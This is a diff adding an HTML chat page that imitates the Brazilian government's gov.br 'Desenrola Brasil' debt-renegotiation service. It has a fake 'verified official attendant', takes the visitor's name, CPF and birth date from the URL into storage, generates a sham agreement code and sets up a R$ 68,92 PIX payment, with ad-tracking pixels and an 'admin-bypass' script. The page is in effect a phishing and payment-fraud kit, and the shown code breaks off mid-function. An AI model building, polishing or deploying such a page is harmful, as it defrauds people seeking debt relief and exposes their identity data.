@@ -1,0 +1,1478 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <!-- Utmify: captura de UTMs + pixel (ver desen/js/utmify-tracking.js) -->
+  <script src="/desen/js/utmify-tracking.js"></script>
+  <!-- Pixel da Meta nativo + eventos Purchase/IC (ver desen/js/meta-pixel.js) -->
+  <script src="/desen/js/meta-pixel.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <script src="/desen/js/admin-bypass.js"></script>
+  <meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no">
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="icon" type="image/png" sizes="32x32" href="images/iconegov.png">
+  <title>Desenrola Brasil — Atendimento e Renegociação Oficial | Portal gov.br</title>
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+  
+  <script src="js/tracking.js"></script>
+  <script src="/desen/js/utmify-order.js"></script>
+  <script src="/desen/js/catalogo.js"></script>
+  <script src="js/tracker.js" async=""></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+  <style>
+    /* --- RESET & PADRÃO gov.BR CHAT --- */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; width: 100%; }
+    body {
+      font-family: 'Rawline', 'Inter', 'Open Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #f0f2f5;
+      color: #1a1a1a;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Barra Brasil */
+    .barra-brasil {
+      background: #000000;
+      color: #ffffff;
+      font-size: 11px;
+      font-weight: 600;
+      padding: 4px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #222;
+      flex-shrink: 0;
+    }
+
+    .barra-brasil-logo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #ffffff;
+      text-decoration: none;
+      font-weight: 800;
+      font-size: 11px;
+      letter-spacing: 0.04em;
+    }
+
+    .flag-icon-svg {
+      display: inline-block;
+      vertical-align: middle;
+      border-radius: 1.5px;
+      flex-shrink: 0;
+    }
+
+    .barra-brasil-nav {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .barra-brasil-nav a {
+      color: #9ca3af;
+      text-decoration: none;
+      font-size: 10px;
+    }
+
+    @media (max-width: 500px) {
+      .barra-brasil-nav { display: none; }
+    }
+
+    .page-chat {
+      display: flex;
+      flex-direction: column;
+      flex: 1;
+      height: 100%;
+      max-width: 720px;
+      width: 100%;
+      margin: 0 auto;
+      background: #f0f2f5;
+      position: relative;
+    }
+
+    /* Header gov.br */
+    .chat-header {
+      background: #ffffff;
+      border-bottom: 2.5px solid #1351B4;
+      box-shadow: 0 1px 4px rgba(0,0,0,.08);
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+      flex-shrink: 0;
+      z-index: 10;
+    }
+
+    .chat-header-brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .chat-header img {
+      height: 32px;
+      width: auto;
+    }
+
+    .btn-user {
+      background: #1351B4;
+      color: #ffffff;
+      border: none;
+      border-radius: 50px;
+      padding: 6px 14px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 13px;
+      font-weight: 700;
+      font-family: inherit;
+      box-shadow: 0 2px 6px rgba(19, 81, 180, 0.25);
+    }
+
+    /* Faixa da Atendente Oficial */
+    .attendant-strip {
+      background: #ffffff;
+      border-bottom: 1px solid #e2e8f0;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 8px 16px;
+      flex-shrink: 0;
+      height: 58px;
+    }
+
+    .attendant-strip img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      object-fit: cover;
+      flex-shrink: 0;
+      border: 2px solid #1351B4;
+    }
+
+    .att-info {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .att-nome {
+      font-weight: 800;
+      font-size: 13.5px;
+      color: #1e293b;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .att-verified-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 14px;
+      height: 14px;
+      background: #1351B4;
+      color: #fff;
+      border-radius: 50%;
+      font-size: 9px;
+      font-weight: 900;
+    }
+
+    .att-cargo {
+      font-size: 11.5px;
+      color: #64748b;
+      font-weight: 500;
+    }
+
+    /* Mensagens / Feed */
+    .chat-msgs {
+      flex: 1 1 auto;
+      overflow-y: auto;
+      padding: 16px 14px 28px;
+      width: 100%;
+      margin: 0 auto;
+      scroll-behavior: smooth;
+    }
+
+    .msg-row {
+      display: flex;
+      margin-bottom: 10px;
+      align-items: flex-end;
+    }
+
+    .msg-row.user {
+      justify-content: flex-end;
+    }
+
+    .avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      object-fit: cover;
+      flex-shrink: 0;
+      margin-right: 8px;
+      margin-bottom: 2px;
+      border: 1.5px solid #1351B4;
+    }
+
+    .bubble-bot {
+      background: #ffffff;
+      color: #1e293b;
+      border: 1px solid #e2e8f0;
+      border-radius: 18px 18px 18px 4px;
+      padding: 12px 16px;
+      font-size: 14px;
+      line-height: 1.55;
+      max-width: 82%;
+      box-shadow: 0 2px 8px rgba(0,0,0,.05);
+      overflow-wrap: break-word;
+      animation: fadeUp .3s ease both;
+    }
+
+    .bubble-user {
+      background: linear-gradient(135deg, #1351B4, #0C326F);
+      color: #ffffff;
+      border-radius: 18px 18px 4px 18px;
+      padding: 12px 16px;
+      font-size: 14px;
+      line-height: 1.55;
+      max-width: 82%;
+      overflow-wrap: break-word;
+      box-shadow: 0 2px 8px rgba(19, 81, 180, 0.25);
+      animation: fadeUp .3s ease both;
+    }
+
+    .bubble-system {
+      color: #64748b;
+      font-size: 12px;
+      font-style: italic;
+      padding: 6px 12px;
+      text-align: center;
+      animation: fadeUp .3s ease both;
+      width: 100%;
+    }
+
+    .bubble-info-card {
+      background: #EFF6FF;
+      border: 1.5px solid #BFDBFE;
+      border-radius: 14px;
+      padding: 16px;
+      font-size: 13.5px;
+      line-height: 1.7;
+      max-width: 86%;
+      box-shadow: 0 3px 10px rgba(19, 81, 180, 0.06);
+      animation: fadeUp .3s ease both;
+    }
+
+    .ic-label { color: #475569; font-size: 12.5px; font-weight: 500; }
+    .ic-value { color: #1351B4; font-weight: 700; font-size: 14px; }
+    .ic-bold  { font-weight: 800; color: #0f172a; font-size: 14.5px; }
+
+    /* Card de Confirmação Cadastral */
+    .confirm-card {
+      background: #ffffff;
+      border: 1px solid #cbd5e1;
+      border-radius: 12px;
+      padding: 16px;
+      font-size: 13.5px;
+      line-height: 1.6;
+      margin-bottom: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+    }
+
+    .confirm-title {
+      font-weight: 800;
+      display: block;
+      color: #0f172a;
+      margin-bottom: 10px;
+      border-bottom: 1px solid #f1f5f9;
+      padding-bottom: 6px;
+    }
+
+    .confirm-card strong {
+      display: block;
+      color: #475569;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.03em;
+    }
+
+    .confirm-card span {
+      display: block;
+      color: #1351B4;
+      font-weight: 700;
+      margin-bottom: 6px;
+      font-size: 14px;
+    }
+
+    .confirm-btns {
+      display: flex;
+      gap: 10px;
+      justify-content: flex-end;
+      flex-wrap: wrap;
+      margin-top: 8px;
+    }
+
+    /* Botões Interativos */
+    .btn-row {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-top: 4px;
+      animation: fadeUp .3s ease both;
+    }
+
+    .btn-row.row-inline {
+      flex-direction: row;
+      flex-wrap: wrap;
+    }
+
+    .chat-btn {
+      background: #ffffff;
+      border: 2px solid #1351B4;
+      color: #1351B4;
+      border-radius: 24px;
+      padding: 11px 20px;
+      font-size: 14px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all .2s;
+      box-shadow: 0 2px 6px rgba(19, 81, 180, 0.12);
+    }
+
+    .chat-btn:hover, .chat-btn.solid {
+      background: #1351B4;
+      color: #ffffff;
+    }
+
+    .chat-btn.wide {
+      border-radius: 12px;
+      text-transform: uppercase;
+      font-size: 14.5px;
+      font-weight: 800;
+      letter-spacing: .03em;
+      padding: 15px 20px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .chat-btn:disabled { opacity: .6; pointer-events: none; }
+
+    .btn-link-final {
+      display: block;
+      width: 100%;
+      background: #168821;
+      color: #ffffff !important;
+      text-decoration: none;
+      text-align: center;
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: .03em;
+      text-transform: uppercase;
+      border-radius: 12px;
+      padding: 16px 20px;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 4px 14px rgba(22, 136, 33, 0.35);
+      animation: fadeUp .3s ease both;
+      transition: all 0.2s;
+    }
+
+    .btn-link-final:hover {
+      background: #13741c;
+      transform: translateY(-1px);
+    }
+
+    .typing {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      padding: 12px 16px;
+      background: #ffffff;
+      border-radius: 18px 18px 18px 4px;
+      border: 1px solid #e2e8f0;
+      box-shadow: 0 2px 6px rgba(0,0,0,.05);
+    }
+
+    .typing span {
+      width: 7px;
+      height: 7px;
+      background: #1351B4;
+      border-radius: 50%;
+      animation: bounce 1.2s infinite;
+    }
+
+    .typing span:nth-child(2) { animation-delay: .2s; }
+    .typing span:nth-child(3) { animation-delay: .4s; }
+
+    @keyframes bounce { 0%,80%,100% { transform: scale(0); } 40% { transform: scale(1); } }
+    @keyframes fadeUp { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+    /* Player de Áudio gov.br */
+    .gov-audio-card {
+      background: #ffffff;
+      border: 1px solid #cbd5e1;
+      border-left: 4px solid #1351B4;
+      border-radius: 12px;
+      padding: 12px 14px;
+      width: 100%;
+      max-width: 320px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+    }
+
+    .audio-play-btn {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: #1351B4;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      color: #ffffff;
+      box-shadow: 0 3px 10px rgba(19, 81, 180, 0.3);
+      transition: transform 0.15s;
+    }
+
+    .audio-play-btn:hover {
+      transform: scale(1.05);
+    }
+
+    .audio-track-info {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .audio-track-bar {
+      height: 6px;
+      background: #e2e8f0;
+      border-radius: 999px;
+      cursor: pointer;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .audio-track-fill {
+      height: 100%;
+      background: #1351B4;
+      border-radius: 999px;
+      width: 0%;
+      transition: width 0.1s linear;
+    }
+
+    .audio-track-time {
+      font-size: 11.5px;
+      color: #64748b;
+      font-weight: 600;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    /* Container de Pagamento PIX Nativo gov.br */
+    .pix-container {
+      background: #ffffff;
+      border: 2px solid #1351B4;
+      border-radius: 16px;
+      padding: 22px 18px;
+      margin: 14px 0;
+      text-align: center;
+      box-shadow: 0 6px 20px rgba(19, 81, 180, 0.08);
+      animation: fadeUp .35s ease both;
+    }
+
+    .pix-header-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #ECFDF5;
+      color: #168821;
+      border: 1px solid #A7F3D0;
+      border-radius: 50px;
+      padding: 5px 14px;
+      font-size: 12px;
+      font-weight: 800;
+      margin-bottom: 12px;
+    }
+
+    .pix-title {
+      font-size: 16px;
+      font-weight: 800;
+      color: #0f172a;
+      margin-bottom: 4px;
+    }
+
+    .pix-sub {
+      font-size: 12.5px;
+      color: #64748b;
+      margin-bottom: 16px;
+    }
+
+    .qrcode-wrapper {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 16px;
+      padding: 10px;
+      background: #ffffff;
+      border-radius: 12px;
+      border: 1px solid #e2e8f0;
+      display: inline-block;
+    }
+
+    .pix-copy-paste {
+      background: #f8fafc;
+      border: 1px dashed #94a3b8;
+      border-radius: 8px;
+      padding: 12px;
+      font-family: monospace;
+      font-size: 11.5px;
+      word-break: break-all;
+      margin-bottom: 12px;
+      cursor: pointer;
+      color: #334155;
+      text-align: left;
+    }
+
+    .pix-copy-paste:active {
+      background: #e2e8f0;
+    }
+
+    .pix-status {
+      font-size: 13px;
+      color: #475569;
+      margin-top: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-weight: 600;
+    }
+
+    .pix-status .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2.5px solid #168821;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Footer gov.br */
+    .site-footer {
+      background: #071D41;
+      padding: 12px 18px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .site-footer .gv {
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 900;
+      letter-spacing: -.5px;
+      margin-bottom: 2px;
+    }
+
+    .site-footer .gv span {
+      color: #FDB913;
+    }
+
+    .site-footer .gv-sub {
+      color: #cbd5e1;
+      font-size: 10.5px;
+      line-height: 1.4;
+    }
+
+    .site-footer .gv-copy {
+      color: #ffffff;
+      font-size: 10.5px;
+      font-weight: 700;
+      margin-top: 2px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="page-chat">
+    <!-- Barra Brasil -->
+    <div class="barra-brasil">
+      <div class="barra-brasil-logo">
+        <svg class="flag-icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 14" width="16" height="11" style="border-radius: 1.5px; flex-shrink: 0; display: inline-block; vertical-align: middle;">
+          <rect width="20" height="14" fill="#009c3b"/>
+          <polygon points="10,1.8 18.2,7 10,12.2 1.8,7" fill="#ffdf00"/>
+          <circle cx="10" cy="7" r="3.2" fill="#002776"/>
+          <path d="M 6.9 7.4 A 3.2 3.2 0 0 1 13.1 6.5 A 3.2 3.2 0 0 0 6.9 7.4 Z" fill="#ffffff"/>
+        </svg>
+        <strong>BRASIL</strong>
+      </div>
+      <nav class="barra-brasil-nav">
+        <a href="javascript:void(0)">Simplifique!</a>
+        <a href="javascript:void(0)">Participe</a>
+        <a href="javascript:void(0)">Acesso à informação</a>
+        <a href="javascript:void(0)">Legislação</a>
+        <a href="javascript:void(0)">Canais</a>
+      </nav>
+    </div>
+
+    <!-- Header gov.br -->
+    <header class="chat-header">
+      <div class="chat-header-brand">
+        <img src="images/iconegov.png" alt="gov.br">
+      </div>
+      <button class="btn-user">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
+        </svg>
+        <span id="nomeUsuario">Usuário</span>
+      </button>
+    </header>
+
+    <!-- Atendente Oficial -->
+    <div class="attendant-strip">
+      <img src="images/leticia.png" alt="Letícia M.">
+      <div class="att-info">
+        <div class="att-nome">
+          Letícia M.
+          <span class="att-verified-badge" title="Atendente Oficial Verificada">✓</span>
+        </div>
+        <div class="att-cargo">Atendente Oficial — Programa Desenrola Brasil</div>
+      </div>
+    </div>
+
+    <!-- Feed de Mensagens -->
+    <div class="chat-msgs" id="msgs"></div>
+
+    <!-- Rodapé Oficial gov.br -->
+    <footer class="site-footer">
+      <div class="gv">gov<span>.br</span></div>
+      <div class="gv-sub">Todo o conteúdo deste site está publicado sob a licença Creative Commons Atribuição-SemDerivações 3.0</div>
+      <div class="gv-copy">Ministério da Fazenda — gov Federal do Brasil</div>
+    </footer>
+  </div>
+
+  <script>
+  /**
+   * Coleta nome/CPF/nasc da URL ou localStorage com fallback consistente.
+   */
+  function paramsFromUrl() {
+    var p = new URLSearchParams(window.location.search);
+    return {
+      nome:   p.get('nome') || '',
+      cpf:    p.get('cpf')  || '',
+      nasc:   p.get('nasc') || ''
+    };
+  }
+
+  function formatCPF(cpf) {
+    var d = String(cpf || '').replace(/\D/g, '').slice(0, 11);
+    if (d.length <= 3) return d;
+    if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3);
+    if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6);
+    return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9);
+  }
+
+  function formatData(data) {
+    if (!data || data.length < 10) return data;
+    var m = String(data).match(/(\d{4})-(\d{2})-(\d{2})/);
+    if (m) return m[3] + '/' + m[2] + '/' + m[1];
+    return data;
+  }
+
+  var u = paramsFromUrl();
+  var storage = {};
+  try {
+    storage.nome = localStorage.getItem('site.nome') || '';
+    storage.cpf  = localStorage.getItem('site.cpf')  || '';
+    storage.nasc = localStorage.getItem('site.nasc') || '';
+  } catch (_) {}
+
+  var NOME          = (u.nome  || storage.nome || 'Contribuinte');
+  var NOME_COMPLETO = NOME;
+  var CPF           = (u.cpf   || storage.cpf  || '');
+  var CPF_FORMATADO = formatCPF(CPF);
+  var NASC          = (u.nasc  || storage.nasc || '');
+
+  // Salva no storage para garantir persistência futura
+  try {
+    if (NOME && NOME !== 'Contribuinte') localStorage.setItem('site.nome', NOME);
+    if (CPF) localStorage.setItem('site.cpf', CPF);
+    if (NASC) localStorage.setItem('site.nasc', NASC);
+  } catch (_) {}
+
+  // Gera código de acordo determinístico por CPF
+  function codeFromCPF(cpf) {
+    var d = String(cpf || '').replace(/\D/g, '');
+    var h = 5381;
+    for (var i = 0; i < d.length; i++) h = (h * 33 + d.charCodeAt(i)) >>> 0;
+    var s = h.toString(36).toUpperCase().padStart(8, 'X');
+    return (s.slice(0, 5) + '-' + s.slice(5, 9) + '-' + s.slice(9, 13) + '-' + s.slice(13, 17)).slice(0, 17);
+  }
+  var CODIGO_ACORDO = codeFromCPF(CPF);
+
+  // Valor PIX. É só o fallback exibido enquanto o catálogo não responde: quem
+  // manda no preço é a tabela em api/produtos.php, etapa "front".
+  var ETAPA = 'front';
+  var VALOR = 'R$ 68,92';
+
+  // Configurações do cliente
+  var PHONE = '11988887777';
+  // E-mail não é mais fixo aqui: o servidor monta a partir do nome do lead.
+  var AVATAR = 'images/leticia.png';
+
+  // Atualiza nome no header
+  try {
+    var el = document.getElementById('nomeUsuario');
+    if (el) el.textContent = (NOME.split(' ')[0] || 'Usuário').toUpperCase();
+  } catch (_) {}
+
+  var msgs = document.getElementById('msgs');
+  var currentAudio = null;
+
+  function tag(t) {
+    return (t||'').replace(/\{NOME\}/g, NOME)
+      .replace(/\{NOME_COMPLETO\}/g, NOME_COMPLETO)
+      .replace(/\{CPF\}/g, CPF)
+      .replace(/\{CPF_FORMATADO\}/g, CPF_FORMATADO)
+      .replace(/\{NASC\}/g, NASC)
+      .replace(/\{CODIGO_ACORDO\}/g, CODIGO_ACORDO)
+      .replace(/\{VALOR\}/g, VALOR);
+  }
+
+  var scroll = function () { setTimeout(function () { msgs.scrollTop = msgs.scrollHeight; }, 60); };
+  var sleep  = function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); };
+
+  // Desbloqueio de áudio por gesto
+  var audioUnlocked = false;
+  function unlockAudio() {
+    if (audioUnlocked) return;
+    try {
+      var dummy = new Audio();
+      dummy.play().then(function() {
+        audioUnlocked = true;
+      }).catch(function() {});
+    } catch(e) {}
+  }
+  document.addEventListener('click', unlockAudio, { once: true });
+
+  function addTyping() {
+    removeTyping();
+    var row = document.createElement('div');
+    row.className = 'msg-row'; row.id = 'typing-row';
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '"><div class="typing"><span></span><span></span><span></span></div>';
+    msgs.appendChild(row); scroll();
+  }
+  function removeTyping() { var el = document.getElementById('typing-row'); if (el) el.remove(); }
+
+  function botRow(inner) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '">' + inner;
+    msgs.appendChild(row); scroll();
+    return row;
+  }
+
+  function addUser(text) {
+    var row = document.createElement('div');
+    row.className = 'msg-row user';
+    row.innerHTML = '<div class="bubble-user">' + text + '</div>';
+    msgs.appendChild(row); scroll();
+  }
+
+  function addSystem(text) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    row.innerHTML = '<div style="width:32px;margin-right:8px;flex-shrink:0"></div><div class="bubble-system">' + tag(text) + '</div>';
+    msgs.appendChild(row); scroll();
+  }
+
+  function addImage(src) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '"><div style="flex:1"><img src="' + src + '" style="max-width:100%;border-radius:10px;margin-top:6px;box-shadow:0 2px 8px rgba(0,0,0,0.06);"></div>';
+    msgs.appendChild(row); scroll();
+  }
+
+  function addVideoAutoplay(src) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    var videoContainer = document.createElement('div');
+    videoContainer.style.position = 'relative';
+    videoContainer.style.display = 'inline-block';
+    videoContainer.style.width = '100%';
+    videoContainer.style.maxWidth = '280px';
+    videoContainer.style.borderRadius = '16px';
+    videoContainer.style.overflow = 'hidden';
+    videoContainer.style.boxShadow = '0 6px 20px rgba(0,0,0,0.12)';
+    videoContainer.style.marginTop = '6px';
+    videoContainer.style.backgroundColor = '#000';
+
+    var video = document.createElement('video');
+    video.src = src;
+    video.autoplay = true;
+    video.playsinline = true;
+    video.style.borderRadius = '16px';
+    video.style.width = '100%';
+    video.style.height = 'auto';
+    video.style.display = 'block';
+    video.style.objectFit = 'contain';
+    video.setAttribute('playsinline', '');
+    video.setAttribute('webkit-playsinline', '');
+
+    var controls = document.createElement('div');
+    controls.style.position = 'absolute';
+    controls.style.bottom = '12px';
+    controls.style.left = '12px';
+    controls.style.display = 'flex';
+    controls.style.gap = '10px';
+    controls.style.zIndex = '10';
+
+    var playPauseBtn = document.createElement('button');
+    playPauseBtn.style.width = '48px';
+    playPauseBtn.style.height = '48px';
+    playPauseBtn.style.borderRadius = '50%';
+    playPauseBtn.style.backgroundColor = '#1351B4';
+    playPauseBtn.style.border = 'none';
+    playPauseBtn.style.cursor = 'pointer';
+    playPauseBtn.style.display = 'flex';
+    playPauseBtn.style.alignItems = 'center';
+    playPauseBtn.style.justifyContent = 'center';
+    playPauseBtn.style.color = '#fff';
+    playPauseBtn.style.boxShadow = '0 3px 10px rgba(0,0,0,0.3)';
+
+    var pauseSvg = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
+    var playSvg = '<svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
+
+    var isPlaying = false;
+    playPauseBtn.innerHTML = playSvg;
+
+    function attemptPlay() {
+      var p = video.play();
+      if (p !== undefined) {
+        p.then(function() {
+          isPlaying = true;
+          playPauseBtn.innerHTML = pauseSvg;
+        }).catch(function(e) {
+          isPlaying = false;
+          playPauseBtn.innerHTML = playSvg;
+        });
+      }
+    }
+
+    setTimeout(attemptPlay, 800);
+
+    playPauseBtn.onclick = function(e) {
+      e.stopPropagation();
+      if (isPlaying) {
+        video.pause();
+        playPauseBtn.innerHTML = playSvg;
+        isPlaying = false;
+      } else {
+        attemptPlay();
+      }
+    };
+
+    videoContainer.onclick = function(e) {
+      if (e.target === video || e.target === videoContainer) {
+        if (!isPlaying) attemptPlay();
+        else { video.pause(); isPlaying = false; playPauseBtn.innerHTML = playSvg; }
+      }
+    };
+
+    controls.appendChild(playPauseBtn);
+    videoContainer.appendChild(video);
+    videoContainer.appendChild(controls);
+
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '">';
+    row.appendChild(videoContainer);
+    msgs.appendChild(row); scroll();
+  }
+
+  function addAudio(src) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+
+    if (currentAudio) {
+      try {
+        currentAudio.pause();
+        currentAudio.currentTime = 0;
+        currentAudio.src = '';
+        currentAudio.load();
+      } catch (e) {}
+    }
+
+    var audio = document.createElement('audio');
+    audio.src = src;
+    audio.preload = 'auto';
+    audio.autoplay = true;
+    currentAudio = audio;
+
+    var audioCard = document.createElement('div');
+    audioCard.className = 'gov-audio-card';
+
+    var playBtn = document.createElement('button');
+    playBtn.className = 'audio-play-btn';
+
+    var audioPlaySvg = '<svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
+    var audioPauseSvg = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
+    playBtn.innerHTML = audioPauseSvg;
+
+    var trackInfo = document.createElement('div');
+    trackInfo.className = 'audio-track-info';
+
+    var trackBar = document.createElement('div');
+    trackBar.className = 'audio-track-bar';
+
+    var trackFill = document.createElement('div');
+    trackFill.className = 'audio-track-fill';
+    trackBar.appendChild(trackFill);
+
+    var timeDiv = document.createElement('div');
+    timeDiv.className = 'audio-track-time';
+    timeDiv.innerHTML = '<span>Mensagem de Voz</span><span id="audio-time">0:00 / 0:00</span>';
+
+    var isPlaying = true;
+    audio.load();
+
+    setTimeout(function() {
+      var p = audio.play();
+      if (p !== undefined) {
+        p.catch(function(e) {
+          isPlaying = false;
+          playBtn.innerHTML = audioPlaySvg;
+        });
+      }
+    }, 200);
+
+    playBtn.onclick = function() {
+      if (isPlaying) {
+        audio.pause();
+        playBtn.innerHTML = audioPlaySvg;
+        isPlaying = false;
+      } else {
+        audio.play();
+        playBtn.innerHTML = audioPauseSvg;
+        isPlaying = true;
+      }
+    };
+
+    audio.onended = function() {
+      playBtn.innerHTML = audioPlaySvg;
+      isPlaying = false;
+      trackFill.style.width = '0%';
+    };
+
+    function updateTime() {
+      if (isNaN(audio.duration)) return;
+      var curMins = Math.floor(audio.currentTime / 60);
+      var curSecs = Math.floor(audio.currentTime % 60);
+      var durMins = Math.floor(audio.duration / 60);
+      var durSecs = Math.floor(audio.duration % 60);
+      
+      var timeStr = curMins + ':' + (curSecs < 10 ? '0' : '') + curSecs + ' / ' + durMins + ':' + (durSecs < 10 ? '0' : '') + durSecs;
+      timeDiv.querySelector('#audio-time').textContent = timeStr;
+    }
+
+    audio.ontimeupdate = function() {
+      if (isNaN(audio.duration)) return;
+      var percent = (audio.currentTime / audio.duration) * 100;
+      trackFill.style.width = percent + '%';
+      updateTime();
+    };
+
+    trackBar.onclick = function(e) {
+      var rect = trackBar.getBoundingClientRect();
+      var percent = (e.clientX - rect.left) / rect.width;
+      audio.currentTime = percent * audio.duration;
+    };
+
+    trackInfo.appendChild(trackBar);
+    trackInfo.appendChild(timeDiv);
+    audioCard.appendChild(playBtn);
+    audioCard.appendChild(trackInfo);
+
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '">';
+    var wrapper = document.createElement('div');
+    wrapper.style.flex = '1';
+    wrapper.appendChild(audioCard);
+    row.appendChild(wrapper);
+    msgs.appendChild(row); scroll();
+  }
+
+  function addAudioThen(audioSrc, onAction) {
+    addAudio(audioSrc);
+    return new Promise(function(resolve) {
+      var audio = currentAudio;
+      var actionExecuted = false;
+      var checkInterval = null;
+
+      function executeCallback() {
+        if (!actionExecuted) {
+          actionExecuted = true;
+          if (checkInterval) clearInterval(checkInterval);
+          onAction().then(resolve).catch(resolve);
+        }
+      }
+
+      function setupMonitoring() {
+        var duration = audio.duration;
+        if (duration && duration > 0) {
+          var executeAt = Math.max(0, duration - 2.5);
+
+          checkInterval = setInterval(function() {
+            if (audio.currentTime >= executeAt && !actionExecuted) {
+              executeCallback();
+            }
+          }, 100);
+
+          audio.onended = executeCallback;
+        }
+      }
+
+      if (audio.readyState >= 1) setupMonitoring();
+      else audio.onloadedmetadata = setupMonitoring;
+
+      // Fallback: se o áudio não tocar ou terminar em 45s, avança normalmente
+      setTimeout(executeCallback, 45000);
+    });
+  }
+
+  function addAudioWithButton(audioSrc, buttonText) {
+    return addAudioThen(audioSrc, function() {
+      return addButtons([buttonText], false, true, true);
+    });
+  }
+
+  function infoCard(lines) {
+    var html = '<div class="bubble-info-card">';
+    lines.forEach(function (l) {
+      html += '<div class="' + ({label:'ic-label',value:'ic-value',bold:'ic-bold'}[l.style] || 'ic-label') + '">' + tag(l.text) + '</div>';
+    });
+    html += '</div>';
+    botRow(html);
+  }
+
+  function addButtons(options, wide, solid, right) {
+    return new Promise(function (resolve) {
+      var wrap = document.createElement('div');
+      wrap.style.marginBottom = '10px';
+      if (right) { wrap.style.display = 'flex'; wrap.style.justifyContent = 'flex-end'; }
+      else { wrap.style.marginLeft = '40px'; }
+      var row = document.createElement('div');
+      row.className = wide ? 'btn-row' : 'btn-row row-inline';
+      options.forEach(function (opt) {
+        var btn = document.createElement('button');
+        btn.className = 'chat-btn' + (wide ? ' wide solid' : '') + (!wide && solid ? ' solid' : '');
+        btn.textContent = opt;
+        btn.onclick = function () {
+          wrap.remove();
+          addUser(opt);
+          resolve(opt);
+        };
+        row.appendChild(btn);
